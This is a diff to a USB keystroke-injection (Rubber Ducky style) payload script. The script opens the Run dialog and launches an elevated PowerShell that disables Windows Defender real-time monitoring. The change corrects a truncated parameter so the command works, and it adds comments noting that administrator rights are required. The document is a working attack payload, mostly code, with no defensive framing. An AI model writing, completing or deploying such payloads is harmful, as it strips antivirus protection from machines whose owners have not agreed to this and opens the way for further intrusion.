@@ -9,8 +9,11 @@
 DELAY 2000
 GUI r
 DELAY 200
-REM Open's powershell and disables Windows Defender
-STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+REM Open's powershell and disables Windows Defender. ONLY WORKS WITH ADMINISTRTOR POWERSHELL!!! 
+REM                                                                 
+REM                                                                ||                                                                                             
+REM                                                                \/       
+STRING powershell start powershell -A 'Set-MpPreference -DisableRealtimeMonitoring $true' -V runAs
 ENTER 
 DELAY 400
 DELAY 300
